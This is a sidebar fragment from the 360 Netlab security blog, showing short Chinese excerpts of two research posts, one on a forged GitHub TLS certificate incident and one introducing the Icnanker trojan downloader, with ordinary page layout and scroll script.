      <div class="inner">
        <div class="read-more-feed">
            <article class="read-more-card" 
                  style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)" 
              >
              <header class="read-more-card-header">
                <small class="read-more-card-header-sitetitle">&mdash; 360 Netlab Blog - Network Security Research Lab at 360 &mdash;</small>
                <h3 class="read-more-card-header-title"><a href="/tag/icnanker/">Icnanker</a></h3>
              </header>
              <div class="read-more-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
              <div class="read-more-card-content">
                <ul>
                  <li><a href="/icnanker-trojan-downloader/">Icnanker, 一个使用了SHC技术的木马下载器</a></li>
                </ul>
              </div>
              <footer class="read-more-card-footer">
                <a href="/tag/icnanker/">1 post →</a>
              </footer>
            </article>

          
<article class="post-card post tag-dnsmon tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/ongoing-websites-hijacking/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">DNSMon</span>
        </div>
        <h2 class="post-card-title">
          一些网站https证书出现问题的情况分析
        </h2>
      </header>
      <div class="post-card-excerpt">[20200328 17:00 更新] 更新数据到20200328 16:00.

20200326下午，有消息说[1]github的TLS证书出现了错误告警。证书的结构很奇怪，在其签发者信息中有一个奇怪的email地址：346608453@qq.com。明显是一个伪造的证书。

为了弄清楚其中的情况，我们对这一事件进行了分析。


DNS劫持？

出现证书和域名不匹配的最常见的一种情况是DNS劫持，即所访问域名的IP地址和真实建立连接的IP并不相同。

以被劫持的域名go-acme.github.io为例，我们的passiveDNS库中该域名的IP地址主要使用如下四个托管在fastly上的IP地址，可以看到其数据非常干净。

对该域名直接进行连接测试，可以看到，TCP连接的目的地址正是185.199.111.153，但其返回的证书却是错误的证书。因此github证书错误的问题并不是在DNS层面出现问题。


劫持如何发生的？

为了搞清楚这个问题，可以通过抓取链路上的数据包来进行分析。为了有较好的对比性，我们先后抓取了443端口和80端口的数据。如下图

左边的数据包为https连接</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Zhang Zaifeng
          </div>

          <a href="/author/zhangzaifeng-2/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2016/09/ant.jpg" alt="Zhang Zaifeng" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-03-27">Mar 27, 2020</time>
      <span class="post-card-meta-length">6 min read</span>
    </footer>

  </div>

</article>
          
<article class="post-card post tag-icnanker tag-shc tag-botnet tag-ddos tag-miner tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/icnanker-trojan-downloader/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">Icnanker</span>
        </div>
        <h2 class="post-card-title">
          Icnanker, 一个使用了SHC技术的木马下载器
        </h2>
      </header>
      <div class="post-card-excerpt">背景介绍


2019年8月15日，360Netlab恶意流量检测系统发现一个通过SSH传播的未知ELF样本(5790dedae465994d179c63782e51bac1)产生了Elknot Botnet的相关网络流量，经分析这是一个使用了&quot;SHC(Shell script compiler)&quot;技术的Trojan-Downloader，作者是老牌玩家icnanker。icnanker其人于2015年被网络曝光，擅长脚本编程，性格高调，喜欢在脚本中留下名字，QQ等印记。

此次攻击，在我们看来没有太多的新颖性，因此并没有公开。

2020年3月12日，友商IntezerLab将一变种(6abe83ee8481b5ce0894d837eabb41df)检测为Icnanker。我们在看了这篇文档之后，觉得还是值得写一笔，因为IntezerLab漏了几个有意思的细节:


 * SHC技术
 * Icananker的分类及其功能
 * Icananker分发的业务



概览


Icnanker是我们观察到的第一个使用SHC技术的家族，针对Linux平台，其名字源于脚本中作者的标识“by</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-03-23">Mar 23, 2020</time>
      <span class="post-card-meta-length">9 min read</span>
    </footer>

  </div>

</article>
        </div>
      </div>
    </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2024</section>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=42b57cac00"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>



</body>
</html>
